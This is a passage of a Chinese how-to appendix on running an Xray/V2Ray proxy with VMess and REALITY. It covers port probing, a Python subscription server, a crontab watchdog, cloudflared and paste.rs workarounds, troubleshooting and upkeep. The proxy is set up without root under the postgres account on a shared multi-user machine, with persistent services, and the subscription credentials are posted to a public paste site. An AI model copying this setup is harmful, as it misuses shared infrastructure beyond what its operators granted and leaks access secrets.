      "realitySettings":{"serverName":"www.bing.com","fingerprint":"chrome",
                         "publicKey":"$PUB","shortId":"$SID"}}}]
}
EOF

$B/xray run -c $T/c.json >/dev/null 2>&1 &
sleep 3
curl -s -m 15 -x socks5h://127.0.0.1:20987 https://api.ipify.org; echo
kill %1 2>/dev/null; rm -rf $T
```

实测输出（四种协议各跑一遍）：

```text
Reality-vision(8444)     [45.198.13.253]
Reality-noflow(8444)     [45.198.13.253]
vmess-ws(8443)           [45.198.13.253]
vmess-ws(8081)           [45.198.13.253]
vmess-ws(8880)           [45.198.13.253]
```

> `-x socks5h://` 里的 **h** 很重要：让 curl 把域名交给代理去解析，否则本地 DNS 污染会误导你。

#### 第 4 步：客户端侧 TCP 可达

```powershell
foreach($p in 8081,8443,8880,8444){ "port ${p}: " + (Test-NetConnection 45.198.13.253 -Port $p -InformationLevel Quiet -WarningAction SilentlyContinue) }
```

#### 第 5 步：客户端侧数据面（I.1.3 的 Probe）

只信第 5 步，不信第 4 步。

#### 第 6 步：交叉验证——服务端 `access.log` 里有没有"你的"记录

这是定位"节点显示 -1"最快的办法：

```bash
grep "from <你的出口IP>" /var/lib/postgresql/.v2ray/access.log | \
  grep -oE "\[(vmess|vless)-[a-z0-9-]+" | sort | uniq -c
```

真实数据（客户端出口 IP `60.162.34.212`）：

```text
   1452 [vmess-ws-8443      ← 主力，一直在用
     18 [vmess-tcp-5222
     10 [vmess-ws-8081
      8 [vmess-ws-8880
      0 [vless-reality-8444  ← 一条都没有！说明客户端根本没连上来
```

**判定逻辑**：

| 现象 | 结论 | 下一步 |
|---|---|---|
| access.log 有记录但客户端报错 | 服务端通了，是**协议/参数**问题 | 核对 UUID / flow / pbk / sid / path |
| access.log **一条都没有**，但数据面探测通 | 客户端**根本没发起连接**（内核不支持/配置解析失败） | 换内核或换兼容参数（无 flow） |
| access.log 没有，数据面探测也不通 | 端口在**链路上被拦** | 换端口段 |

#### 附：客户端侧如何"看见" REALITY 在正常工作

从客户端网络直接对该端口做 TLS 握手，看拿到的**是不是真 bing 的证书**：

```powershell
$c = New-Object Net.Sockets.TcpClient
$c.Connect("45.198.13.253", 8444)
$ssl = New-Object System.Net.Security.SslStream($c.GetStream(), $false, ({$true}))
$ssl.AuthenticateAsClient("www.bing.com")
"proto=" + $ssl.SslProtocol
"subject=" + $ssl.RemoteCertificate.Subject
"issuer="  + $ssl.RemoteCertificate.Issuer
```

```text
proto=Tls12
subject=CN=r.bing.com, O=Microsoft Corporation, L=Redmond, S=WA, C=US
issuer=CN=Microsoft TLS G2 ECC CA OCSP 02, O=Microsoft Corporation, C=US
```

拿到 **bing 的真证书** = REALITY 工作正常，端口通畅。同时对照：明文 WS 端口（8443）做 TLS 握手会失败（`Cannot determine the frame size or a corrupted frame was received`），说明它确实是明文 —— 两个测试互相印证。

---

### I.7 订阅：一次导入多个节点

#### I.7.1 订阅格式（v2rayN 标准）

就是 **base64(每行一个分享链接)**，MIME 无换行也无所谓。

```text
订阅体 = base64(
  "vmess://....\n
   vmess://....\n
   vless://...."
)
```

#### I.7.2 链接怎么拼

**VMess（`vmess://` + 整段 base64(JSON)）**

```powershell
function VM($ps,$port,$net){
  $o = [ordered]@{
    v="2"; ps=$ps; add="45.198.13.253"; port="$port"; id="<UUID>"
    aid="0"; scy="auto"; net=$net; type="none"; host=""; path="/2f9ac7"
    tls=""; sni=""; alpn=""; fp=""
  }
  "vmess://" + [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($o|ConvertTo-Json -Compress)))
}
```

字段含义：`ps`=备注 / `add`+`port`=地址端口 / `id`=UUID / `aid`=alterId / `net`=传输(ws|tcp) / `path`=WS 路径 / `tls`=空或tls / `scy`=加密方式。

**VLESS（标准 URI 查询串）**

```text
vless://<UUID>@<IP>:8444
  ?encryption=none
  &security=reality
  &sni=www.bing.com
  &fp=chrome
  &pbk=<公钥>
  &sid=<shortId>
  &flow=xtls-rprx-vision        ← 老客户端这条要删掉
  &type=tcp
  &headerType=none
  #节点备注
```

#### I.7.3 托管第一版：`python3 -m http.server`（能用，但有坑）

```bash
B=/var/lib/postgresql/.v2ray
mkdir -p "$B/sub"
# 两种文件都放：sub=base64（客户端订阅用），sub.txt=明文（手贴单条链接时用）
printf '%s' "$B64"   > "$B/sub/sub"
printf '%s' "$LINKS" > "$B/sub/sub.txt"

setsid nohup python3 -m http.server 8888 --bind 0.0.0.0 --directory "$B/sub" \
  >/dev/null 2>&1 </dev/null &

curl -s http://127.0.0.1:8888/sub | wc -c        # 实测 1904 字节
```

**坑在响应头**：

```text
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.10.12
Content-type: application/octet-stream      ← 因为文件名 `sub` 没有扩展名
```

`SimpleHTTPRequestHandler` 按**扩展名**猜 MIME，无名文件一律 `application/octet-stream`。大多数 v2ray 客户端不挑，但有的会当二进制流拒掉；而且它还会**列目录**（`GET /` 能看到你放了什么）。所以第二版自己写了 40 行 handler，见 I.7.5。

#### I.7.4 静态快照备份（443 可取的退路）

订阅端口被拦、或者客户端只吃 HTTPS（见 I.14）时，把订阅粘到一个公共 paste 站，走 443：

```bash
curl -s --data-binary @"$B/sub/sub" https://paste.rs/     # 返回 https://paste.rs/xxxxx
```

> **两条纪律**（我在这上面把自己绕晕过一次）：
> 1. **静态快照必须带版本/日期**，比如 `https://paste.rs/Uz0Ps`（2026-11-26 追补 REALITY 后，5 条）与 `https://paste.rs/oSq08`（当天早些时候，4 条、无 REALITY）—— 内容一样看着像，差两条节点。**没有版本号，三天后你自己都不知道哪条是新的。**
> 2. 每次改完节点**立刻重新上传一份并记录下来**，旧的那条在客户端里删掉，别留在列表里。

#### I.7.5 托管第二版：40 行订阅服务（推荐）

`/var/lib/postgresql/.v2ray/subsrv.py`（`chmod 700`），解决三件事：正确的 `Content-Type`、末尾换行、不列目录。

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""极简订阅服务
  GET /sub      -> base64(每行一个分享链接)，text/plain; charset=utf-8
  GET /sub.txt  -> 明文链接
  GET /         -> 简单说明（不列目录）
"""
import os, sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

BASE = os.path.dirname(os.path.abspath(__file__))
SUB = os.path.join(BASE, "sub", "sub")          # base64 订阅
SUB_TXT = os.path.join(BASE, "sub", "sub.txt")  # 明文链接

def read_text(path):
    try:
        with open(path, "rb") as f:
            return f.read().decode("utf-8").strip()
    except OSError:
        return ""

class Handler(BaseHTTPRequestHandler):
    server_version = "sub/1.0"

    def _send(self, body, ctype="text/plain; charset=utf-8", code=200):
        data = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("Profile-Update-Interval", "12")   # 客户端自动更新间隔（小时）
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        path = self.path.split("?")[0].rstrip("/") or "/"
        if path in ("/sub", "/s"):
            b64 = read_text(SUB)
            if not b64:
                return self._send("sub empty\n", code=503)
            self._send(b64 + "\n")                 # 末尾补换行，防客户端读丢最后一条
        elif path in ("/sub.txt", "/raw"):
            txt = read_text(SUB_TXT)
            self._send(txt + ("\n" if not txt.endswith("\n") else ""))
        elif path == "/":
            self._send("sub service\n/sub  base64\n/sub.txt  plain\n")
        else:
            self._send("not found\n", code=404)

    def do_HEAD(self):
        self._send("", code=200)

    def log_message(self, fmt, *args):
        sys.stderr.write("%s %s\n" % (self.client_address[0], fmt % args))

if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8888
    ThreadingHTTPServer(("0.0.0.0", port), Handler).serve_forever()
```

起服务并核对响应头（实测）：

```bash
setsid nohup python3 "$B/subsrv.py" 8888 >/dev/null 2>&1 </dev/null &
curl -sS -i -m 6 http://127.0.0.1:8888/sub | head -7
```

```text
HTTP/1.0 200 OK
Server: sub/1.0 Python/3.10.12
Content-Type: text/plain; charset=utf-8      ← 关键差别
Content-Length: 1905
Cache-Control: no-store
Profile-Update-Interval: 12
```

> 换服务时别忘了**同时改 watchdog**：它原来按 `http.server 8888` 判活，改成按 `subsrv.py` 判活，否则 watchdog 会把老服务反复拉起来，和新服务抢 8888 端口。

#### I.7.6 五个"看起来对其实错"的坑

1. **`while read` 漏掉最后一行**：文件末尾没有换行时，`while IFS= read -r l` 会跳过最后一条，于是"5 条订阅只显示 4 条"。要么 `printf '%s\n'` 结尾补换行，要么用 `[ -n "$l" ]` 之外再兜一次。
2. **PowerShell 把 `${host_}:20808` 当变量**：`"vless://$uuid@$host_:20808"` 里的 `$host_:` 会被解析成带作用域的变量，输出变成 `@=none&security=...`。**变量后面紧跟冒号时一律写 `${host_}`**。
3. **`Invoke-WebRequest` 默认走系统代理**：客户端开着代理时，你以为在测"直连"其实在测"走代理"，结果就是"TCP 探测超时、HTTP 却返回 200"这种自相矛盾。测直连要用 `-NoProxy`。
4. **订阅服务回 `application/octet-stream`**：文件名没有扩展名时 `http.server` 就是这么给头的，个别客户端会拒收 → 见 I.7.5。
5. **给手机端用 `http://` 订阅**：Android 9+ 的明文策略会直接掐掉 → 见 I.14。

---

### I.8 守护：没有 systemd 怎么保证它活着

#### I.8.1 思路

systemd 用不了 → 退回到 **用户 crontab 每分钟巡检 + `setsid nohup` 拉起**。

`/var/lib/postgresql/.v2ray/watchdog.sh`（`chmod 700`）：

```bash
#!/bin/bash
B=/var/lib/postgresql/.v2ray
cd "$B" || exit 1

# 1) xray 不在就拉起（pgrep 用 -f 匹配配置路径，避免误判别的进程）
if ! pgrep -u postgres -f "$B/config.json" >/dev/null 2>&1; then
  setsid nohup ./xray run -c "$B/config.json" >/dev/null 2>&1 </dev/null &
fi

# 2) 订阅 http 服务同理
if ! pgrep -u postgres -f "http.server 8888" >/dev/null 2>&1; then
  setsid nohup python3 -m http.server 8888 --bind 0.0.0.0 --directory "$B/sub" \
    >/dev/null 2>&1 </dev/null &
fi
exit 0
```

```bash
( crontab -l 2>/dev/null; echo '* * * * * /var/lib/postgresql/.v2ray/watchdog.sh >/dev/null 2>&1' ) | crontab -
crontab -l
```

#### I.8.2 三个关键细节（都在坑里学到的）

| 细节 | 为什么 |
|---|---|
| `setsid nohup ... </dev/null` | 不加的话，ssh 会话一断，进程跟着 SIGHUP 死；而且**后台进程继承 stdout 会让 ssh 不退出**，表现是命令"卡住不返回"（我这边出现过两次，只能 kill 掉后台作业） |
| `pgrep -f "$B/config.json"` | 用唯一路径匹配，避免 `pgrep xray` 误判；别用 `pkill -f xray` 这种宽匹配，会连测试用的临时客户端一起杀 |
| 用户 crontab 而非 `/etc/cron.d` | `/etc/cron.d` 需要 root 建文件；用户 crontab 只要 `cron.allow` 允许即可 |

#### I.8.3 和 systemd 的差距（别自欺欺人）

| 能力 | systemd | crontab watchdog |
|---|---|---|
| 进程崩溃拉起 | 秒级（`RestartSec=15`） | **最坏 60 秒** |
| 开机自启 | `enable` 即可 | cron 服务本身开机自启，所以也能自启，但同样有最多 60 秒窗口 |
| 日志 | `journalctl -u xray` | 只有 xray 自己的 `error.log` / `access.log` |
| 资源限制/沙箱 | 可配 `MemoryMax`、`ProtectSystem` | 无 |
| 多实例/依赖顺序 | 支持 | 无 |

---

### I.9 实测性能与"为什么卡"（数据说话）

#### I.9.1 服务器自身（完全不是瓶颈）

```bash
uptime; nproc; ps -o pid,pcpu,pmem,rss,etime -C xray
curl -s -o /dev/null -m 30 -w "down=%{speed_download} B/s time=%{time_total}s\n" \
  "https://speed.cloudflare.com/__down?bytes=30000000"
ping -c 3 -W 2 1.1.1.1 | tail -2
cat /proc/sys/net/ipv4/tcp_congestion_control
```

```text
load average: 0.21, 0.09, 0.07     （16 核）
xray: CPU 0.3%  RSS 47MB  已跑 57 分钟
down=113939771 B/s   time=0.263s    ← ≈900 Mbps，0.26 秒下完 30MB
rtt min/avg/max = 1.974/2.540/2.880 ms
cubic                                ← 不是 BBR
```

#### I.9.2 链路（瓶颈全在这）

```powershell
# 客户端到服务器：用 TCP 握手测 RTT（ICMP 被拦，ping 不通）
1..5 | ForEach-Object {
  $c=New-Object Net.Sockets.TcpClient; $sw=[Diagnostics.Stopwatch]::StartNew()
  $i=$c.BeginConnect("45.198.13.253",8443,$null,$null)
  if($i.AsyncWaitHandle.WaitOne(4000)){ $c.EndConnect($i); $sw.Stop(); "$($sw.ElapsedMilliseconds) ms" }
  $c.Close()
}
```

```text
513 ms / 286 ms / 358 ms / 349 ms / 288 ms     ← 孟买节点
以及一次 3360 ms                                ← 严重抖动/丢包
```

对照另一台"一点都不卡"的节点：

```text
32.188.73.145  → 美国俄勒冈 AWS us-west-2 (AS16509)
TCP RTT: 192 / 208 / 179 / 179 ms   ← 稳定，且比"地理更近"的孟买还快
```

#### I.9.3 归因（按权重排，别瞎换内核）

| 权重 | 因素 | 依据 | 能不能改 |
|---|---|---|---|
| ★★★★★ | **路由质量 / RTT / 丢包** | 到孟买 300ms 且抖到 3.3s；到美西 190ms 稳定 | 换落地（无 root 也能做） |
| ★★★★ | **拥塞控制 cubic vs BBR** | `cubic`，高 RTT + 丢包下吞吐会崩 | 要 root（`sysctl`） |
| ★★★ | **协议** | VMess/TCP 对丢包最敏感；Hysteria2(QUIC) 有用户态抗丢包 | 要 root 装 sing-box |
| ★ | 内核（Xray vs sing-box） | 都是 Go，GB 级吞吐都不是问题 | 换了也没用 |
| ★ | 服务端算力 | load 0.2 / CPU 0.3% / 900Mbps 出口 | 无 |

**顺带一个实战发现**：从 `access.log` 里看到客户端把流量**链式**走过两台机：

```text
from 60.162.34.212 accepted tcp:32.188.73.145:7863 [vmess-ws-8443 >> direct]
```

意思是"用户 → 孟买 → AWS"。**链式会把两段 RTT 相加**（300 + 190 ≈ 500ms），越链越慢。要么直连其中一条，要么只留一条。

---

### I.10 边界与纪律：无 root 到底做不到什么

| 做不到 | 原因 | 影响 |
|---|---|---|
| 绑 80/443 | 1024 以下端口需要 root，且已被 nginx 占用 | 无法做"像正常网站"的伪装；REALITY 只能挂非 443（官方警告会提高被封概率） |
| systemd 服务 | 需要 root 写 `/etc/systemd/system` | 守护退化到 60 秒粒度 |
| 改 `sysctl` 开 BBR | 需要 root | 高延迟链路吞吐上不去 |
| 改防火墙 / 端口转发 | 需要 root | 端口面不受控 |
| 读系统日志做审计 | `/var/log/auth.log` 640 `syslog:adm` | 想统计登录失败次数都做不到 |
| **隐藏进程** | `procfs` 默认 `hidepid=0`，**任何登录用户都能看到所有进程的完整命令行**；`hidepid=2` 要 root 且会写进 `/proc/mounts`，管理员一眼看出被改过 | 只能"改名"骗过 `ps \| grep` 这类粗查，骗不过 `ss -lnt` / `lsof` / `/proc/<pid>/cwd`。**属于隐匿痕迹，不做** |

**共享机的现实风险**（实测盘点这台机器）：

```text
36 个普通账号（nithin / karthik / pixiq-* / Jetson-* / builder-deploy …）
LXD 容器在跑（redis 在容器里）
GitHub Actions Runner 常驻（builder-deploy）
59 个监听端口：nginx、PG、redis、rabbitmq、mongo、NFS、SMB、多个内部应用
```

→ 这台是**多人共用的训练机**，有人在天天运维：`ss -lnt` 一敲就能看到新开的端口。**在上面跑代理，暴露面属于"必然被发现"级别**；而且一旦 IP 被打标/被墙，连累的是全部业务和所有同事。这不是技术问题，是判断问题。

**本次留下的东西**（诚实清单，2026-11-26 终态）：

| 位置 | 内容 |
|---|---|
| `/var/lib/postgresql/.v2ray/`（700） | `xray` 二进制（35MB）、`config.json`（600）、`subsrv.py`、`watchdog.sh`、`access.log`、`error.log`、`geoip.dat`/`geosite.dat`、`cert.pem`/`key.pem`（自签 TLS 那条已下线，文件留着但不再引用）、`config.json.bak*`（改动前备份） |
| `/var/lib/postgresql/.v2ray/sub/` | `sub`（base64 订阅）、`sub.txt`（明文）、`sub-full` / `sub-full.txt`（历史 7 条全量，不再对外） |
| 用户 crontab | 1 行 watchdog（另有 1 行心跳监控，与本节点无关） |
| 运行进程 | `postgres  ./xray run -c .../config.json`、`postgres  python3 .../subsrv.py 8888` |
| 对外端口 | 8081 / 8443 / 8880 / 8444（代理）+ 8888（订阅） |
| 已下线 | 20080 / 20443 / 20553 / 20808 / 5222 / 10443（6 个端口，`ss -lnt` 已无）|
| 已清理 | Cloudflare 隧道 `cf` 二进制与日志、`/tmp` 下的全部测试配置与临时服务 |

完全卸载（一条命令，不留尾巴）：

```bash
pkill -f /var/lib/postgresql/.v2ray/config.json
pkill -f "subsrv.py"
pkill -f "http.server 8888"
crontab -l | grep -v '.v2ray/watchdog.sh' | crontab -
rm -rf /var/lib/postgresql/.v2ray
```

⚠️ 卸载后仍然留在世上的（删不掉的）：`access.log` 里对方出口 IP 的连接记录如果已被别人备份；第三方 paste 站上的静态快照（paste.rs 无法删除）；以及**对端设备/运营商侧的连接日志**（这个本来就不受你控制）。

---

### I.11 新手复现清单（照着勾）

**准备**

- [ ] `id` 确认身份；`sudo -n -l` 确认**没有**免密 sudo（有 root 就走官方安装脚本，别折腾这套）
- [ ] `command -v curl unzip python3 crontab` 全部存在
- [ ] `curl -s -o /dev/null -w '%{http_code}' https://github.com/` 出网正常
- [ ] `ss -lnt` 抄一份现有端口，避免撞车

**选端口（最容易翻车的一步）**

- [ ] 临时开一个纯 python HTTP 端口做对照：`python3 -m http.server 25xxx`
- [ ] 跑 I.1.3 的 `Probe`，**数据面**能读到内容的段才是可用段
- [ ] 只用 `DATA-OK` 的端口，别用 `connected-but-no-response`（那是数据被丢）

**安装与配置**

- [ ] 下载 → `unzip` → `chmod 700 xray` → `./xray version` 记账
- [ ] `./xray x25519` / `./xray uuid` / `openssl rand -hex 8` 三样都生成并另存
- [ ] 写 `config.json`（`chmod 600`），**别忘 `geoip:private → block`**
- [ ] `xray run -test -c c4.json`（扩展名必须是 `.json`）
- [ ] 校验通过再 `mv` 覆盖 + `pkill` 重启

**验证（六步都做）**

- [ ] `ss -lnt` 看到端口在听
- [ ] 服务端本机 socks 端到端 → 落地 IP 正确
- [ ] 客户端 TCP 可达
- [ ] 客户端**数据面**探测（不是 Test-NetConnection）
- [ ] REALITY 端口从客户端 TLS 握手 → 拿到的是真站证书
- [ ] `access.log` 里能看到客户端 IP 的记录

**订阅与守护**

- [ ] 生成链接 → base64 → 写 `sub`（base64）与 `sub.txt`（明文）两个文件
- [ ] 用 `subsrv.py` 托管（**不要**用裸 `python3 -m http.server`，`Content-Type` 会不对）
- [ ] `curl -sS -i .../sub | head -7` 看到 `Content-Type: text/plain; charset=utf-8`
- [ ] `curl .../sub | base64 -d | grep -c '://'` 与 `grep -c '://' sub.txt` **数字相等**
- [ ] 443 备份粘一份到 paste.rs，并在文档里记下**版本/日期**（不然三天后自己都分不清新旧）
- [ ] `watchdog.sh` + 用户 crontab 每分钟；**改过进程名/服务名后记得同步改 watchdog 的判活串**
- [ ] 手动 `kill` 一次进程，等 60 秒确认被拉起（**这一步一定要做**，不然"自愈"只是你以为有）
- [ ] 手机端试导一次：`http://` 导不进、`https://` 能导 → 按 **I.14** 处理，别去改 UUID

---

### I.12 排障手册（症状 → 判断 → 处置）

| 症状 | 判断 | 处置 |
|---|---|---|
| 客户端节点显示 -1，`access.log` 有记录 | 协议参数不匹配 | 逐字核对 UUID / flow / pbk / sid / path / net |
| 客户端 -1，`access.log` **无记录**，数据面探测 OK | 客户端内核不支持该协议 | REALITY 换无 flow 的 UUID；或改用 VMess |
| 客户端 -1，数据面探测也超时 | 端口被链路过滤 | 换 8xxx 段端口重新探测 |
| 握手通了但一用就断 | 明文协议被 DPI 识别/干扰 | 换 REALITY；不要指望换端口解决 |
| `xray run -test` 报 `Failed to get format` | 文件扩展名不是 `.json` | 改名成 `*.json` |
| 配置报 `allowInsecure has been removed` | Xray ≥26 | 改 `pinnedPeerCertSha256`（**hex 字符串**） |
| 配置报 `cannot unmarshal array into ... pinnedPeerCertSha256` | 写成了数组 | 去掉 `[]` |
| 配置报 `encoding/hex: invalid byte` | 指纹用了 base64 | 用 `openssl dgst -sha256` 的 hex |
| 客户端报 `legacy Common Name field` | 自签证书没 SAN | `-addext "subjectAltName=DNS:..."` |
| ssh 里执行启动命令后**卡住不返回** | 后台进程继承了 stdout | 加 `</dev/null >/dev/null 2>&1`，必要时 `setsid` |
| 订阅里少一个节点 | 文件末尾无换行被 `while read` 跳过 | 末尾补换行；`grep -c 'vmess://'` 核对 |
| `curl` 测试莫名"通"了但客户端不通 | 测试请求走了系统代理 | PowerShell 加 `-NoProxy`；或改用 socket 直连探测 |
| 越用越慢 | 链式代理叠加 RTT / 端口被限速 | 砍掉链路中段；换端口段；换落地 |
| **手机能导入 `https://` 的订阅，`http://` 的导不进** | Android 9+ 明文 HTTP 策略（App 层）+ 端口过滤，两者叠加 | 改用 HTTPS 通道，见 **I.14** |
| 手机上"更新订阅"报错但 PC 上同一地址正常 | 手机网络与 PC 不是同一条出口 | 手机浏览器直接打开该 URL 自测：能出 base64 乱码 = App 明文限制；超时 = 端口被拦 |
| 导入成功但节点全 -1 | 订阅是**旧的静态快照**（端口/UUID 已变） | 核对订阅里的端口是否还在 `ss -lnt` 里；重新拉活订阅 |
| 订阅能取到，导入后节点数是 4 而不是 5 | 拉的是旧快照（没有 REALITY 那两条） | 换成活的 `/sub` 或最新快照（**快照必须带版本号**） |

---

### I.13 术语补充

| 术语 | 一句话解释 |
|---|---|
| **VMess** | V2Ray 的原始协议，靠 UUID + 时间戳做认证，**无前向保密**，能过很多老客户端 |
| **VLESS** | 更轻的协议，本身不带加密（靠传输层 TLS/REALITY 保护），v2ray 5.x / Xray 都支持 |
| **REALITY** | 不用证书的 TLS 伪装：借用真实站点（如 bing）的证书链完成握手，探测者看到的是真站 |
| **WS / WebSocket** | 把代理流量塞进 HTTP Upgrade 之后的双向流，能骗过一些只看 HTTP 的设备 |
| **AEAD（alterId=0）** | VMess 的新认证方式，防重放；要求客户端 ≥ v2ray 4.27 |
| **XTLS-Vision（flow）** | 减少 TLS 套 TLS 的重复封装，提升吞吐；老客户端不支持 |
| **subscription（订阅）** | base64 编码的多条分享链接，客户端定时拉取更新 |
| **`Test-NetConnection`** | 只做 TCP 三次握手，**不能证明数据面可用**（本附录 I.1.3 的核心教训） |
| **hidepid** | `/proc` 挂载参数，控制普通用户能否看到别人的进程；默认 0 = 全可见 |
| **BBR** | Google 的拥塞控制算法，高延迟+丢包链路上比 cubic 吞吐高数倍 |
| **TUIC / Hysteria2** | 基于 QUIC/UDP 的代理协议，自带抗丢包，需 sing-box |
| **明文 HTTP（cleartext）** | 不带 TLS 的 HTTP；Android 9+ 默认禁止 App 使用，报错常表现为"导入失败/连接失败" |
| **`usesCleartextTraffic`** | Android 清单里的开关，`false` 时 App 不能发明文 HTTP —— 手机端订阅失败的头号原因 |
| **快速隧道（quick tunnel）** | cloudflared 的免账号临时通道，给一个 `https://xxx.trycloudflare.com`，**每次重启 URL 都变** |
| **Content-Type** | HTTP 响应里的资源类型；订阅服务必须是 `text/plain`，`application/octet-stream` 可能被客户端拒收 |
| **静态快照 vs 活订阅** | 快照内容写死（改节点不变，必须重传）；活订阅由服务端文件驱动，改完客户端"更新订阅"即生效 |

---

### I.14 手机端（Android）导入不了订阅：专章

#### I.14.1 症状与第一反应

真实场景：

| 客户端 | 订阅地址 | 结果 |
|---|---|---|
| PC（v2rayN） | `http://45.198.13.253:8888/sub` | ✅ 正常导入 |
| 手机（v2rayNG / v2rayN 安卓版） | 同一个 `http://...:8888/sub` | ❌ **导入失败** |
| 手机 | `https://paste.rs/xxxxx`（同一份内容） | ✅ 正常导入 |

**内容一样、只有"取的方式"不同** → 问题必然在传输层，不在订阅内容。别去改 UUID、别去重装客户端。

#### I.14.2 两个原因（通常同时存在）

1. **Android 明文 HTTP 策略（App 层，最常见）**
   Android 9（API 28）起默认 `cleartextTrafficPermitted=false`：App 里用 `http://` 会被系统直接拦，抛出的异常在客户端界面通常被简化成"导入失败/连接失败"。**这跟网络通不通完全无关** —— 同一个 URL 用手机浏览器打开是好的，App 里就是不行。
2. **非标端口被过滤（网络层）**
   手机常走蜂窝或另一个 WiFi，出口策略与 PC 不同。本环境实测过"2xxxx 段全灭、5222 半死"，非标端口天然更容易被掐。

#### I.14.3 三十秒判别（不用装任何工具）

**用手机浏览器**打开那个 `http://...:8888/sub`：

| 现象 | 结论 | 处置 |
|---|---|---|
| 显示一大坨 base64 乱码 | 网络通 → **是 App 的明文限制** | 换 HTTPS 地址（I.14.4） |
| 转圈后超时/打不开 | **端口被手机网络拦了** | 换 HTTPS 地址（更稳），或换端口段 |

> 这一招的价值：**用浏览器把"网络问题"和"App 问题"分开**。浏览器不是 App，不受 cleartext 策略约束，是最干净的对照组。

#### I.14.4 解法一：cloudflared 快速隧道（免账号、免域名、给真证书）

思路：在服务器上起一条出站隧道，Cloudflare 反代给你一个 **HTTPS 443 + 正规证书**的域名，客户端只跟这个域名打交道 —— 明文策略和端口过滤同时绕过。

```bash
B=/var/lib/postgresql/.v2ray; cd "$B"

# 1) 下二进制（40MB，纯静态，无 root 也能跑）
curl -sSL -m 180 -o cf \
  https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
chmod 700 cf && ./cf --version          # 实测 2026.11.2

# 2) 指向本地 8888 的订阅服务
setsid nohup ./cf tunnel --url http://127.0.0.1:8888 --no-autoupdate > "$B/cf.log" 2>&1 </dev/null &
sleep 18

# 3) 从日志里抠 URL（每次启动都不一样）
grep -oE "https://[a-z0-9-]+\.trycloudflare\.com" "$B/cf.log" | head -1 | tee "$B/cf_url"

# 4) 验证
U=$(cat "$B/cf_url")
curl -s -m 20 -o /dev/null -w "tunnel:%{http_code} size=%{size_download}\n" "$U/sub"
```

实测：

```text
https://tomato-reaches-frankfurt-wallpaper.trycloudflare.com
tunnel:200 size=1905                      ← 与本地 8888 逐字节一致
DNS: 104.16.230.132 / 104.16.231.132      ← 未被污染
从国内出口取: HTTP 200, len=1905, Content-Type: text/plain; charset=utf-8
```

注意事项（必须写进交付）：

| 事项 | 说明 |
|---|---|
| URL 会变 | 隧道进程一重启就换域名。**用完记得把新 URL 告诉对方**（我把它记在 `$B/cf_url`，并在 watchdog 里加了一段"重启即记录"） |
| 依赖 Cloudflare | 流量过第三方；`trycloudflare.com` 在部分地区会被限速甚至不可达 |
| 不是长久的 | 快速隧道给的是临时演示通道，随时可能被回收；正经做法是命名隧道（要 Cloudflare 账号 + 域名） |
| 拆除 | `pkill -f "cf tunnel"` + 从 watchdog 里摘掉那段 + `rm -f cf cf.log cf_url cf_history`（省 40MB） |

**加入 watchdog 的写法**（可选，能自愈但 URL 会变）：

```bash
if ! pgrep -u postgres -f "cf tunnel" >/dev/null 2>&1; then
  setsid nohup ./cf tunnel --url http://127.0.0.1:8888 --no-autoupdate > "$B/cf.log" 2>&1 </dev/null &
  sleep 12
  grep -oE "https://[a-z0-9-]+\.trycloudflare\.com" "$B/cf.log" | head -1 > "$B/cf_url"
  date -u +%FT%TZ >> "$B/cf_history"; cat "$B/cf_url" >> "$B/cf_history"
fi
```

#### I.14.5 解法二：公共 paste 站（最省事，代价是静态）

```bash
curl -s --data-binary @"$B/sub/sub" https://paste.rs/     # → https://paste.rs/xxxxx
```

优点：443 + 正规证书 + 不依赖你的服务器存活。
缺点：**是快照**。你改了端口/UUID，它不会更新，手机会拿到一堆失效节点（表现：导入成功但全部 -1）。

#### I.14.6 三种方案怎么选（别叠三层）

| 方案 | 手机能导 | 会随节点变化更新 | 依赖 | 适合 |
|---|---|---|---|---|
| 本地 `http://...:8888/sub` | ❌（大概率） | ✅ | 自己服务器 | **PC 端** |
| cloudflared 快速隧道 `https://` | ✅ | ✅（但 URL 会变） | Cloudflare | 手机临时用 |
| paste.rs 快照 `https://` | ✅ | ❌ | 第三方 | 手机长期、节点不动时 |

**交付纪律**：给用户只留"当前该用的那一条"，多余的通道全部拆掉 —— 否则对方会像这次一样在三条地址之间绕晕（"到底哪个是哪个"）。本次最终状态就是：**只保留 PC 的 `http://45.198.13.253:8888/sub`，隧道与 cf 二进制全部清除**，手机端由使用者从 PC 复制分享链接过去。

---

### I.15 日常维护剧本（增、删、换、回滚、体检）

#### I.15.0 三条铁律

1. **`config.json` 是唯一事实源**：所有改动落到这一个文件，改完重启才生效；不要在服务器上手工多版本漂移。
2. **改前先备份**：`cp -p config.json config.json.bak.$(date +%s)`，回滚只认备份文件。
3. **先 `-test` 再 `mv`**：`xray run -test -c c4.json && mv -f c4.json config.json`，验证不过绝不覆盖。

> **我在这条上出过一次险情**：本地留着一份 `config-v3.json`，服务器上后来手工给 REALITY 加过第二个 UUID（无 flow）。精简端口时如果直接拿本地那份覆盖，**第二个 UUID 会被静默删掉** —— 客户端不会报错，只会突然连不上。发现后我先把本地那份补齐 2 个 client 再覆盖。
> **教训**：要么"只在一处改"，要么"每次改之前先从服务器拉一份回来"。**两处各改一点，必然对不上。**

#### I.15.1 加一个节点（以"再加一个 8xxx 端口"为例）

```bash
B=/var/lib/postgresql/.v2ray; cd "$B"
cp -p config.json "config.json.bak.$(date +%s)"

python3 - config.json 8455 <<'PY'
# -*- coding: utf-8 -*-
import json, sys
p, port = sys.argv[1], int(sys.argv[2])
c = json.load(open(p))
tag = "vmess-ws-%d" % port
if not any(i.get("tag") == tag for i in c["inbounds"]):
    c["inbounds"].append({
        "tag": tag, "listen": "0.0.0.0", "port": port, "protocol": "vmess",
        "settings": {"clients": [{"id": "<UUID>", "alterId": 0}]},
        "streamSettings": {"network": "ws", "wsSettings": {"path": "/2f9ac7"}},
    })
json.dump(c, open(p + ".tmp", "w"), ensure_ascii=False, indent=2)
print("ok")
PY
mv -f config.json.tmp c4.json && ./xray run -test -c c4.json && mv -f c4.json config.json

pkill -f "$B/config.json"; sleep 1
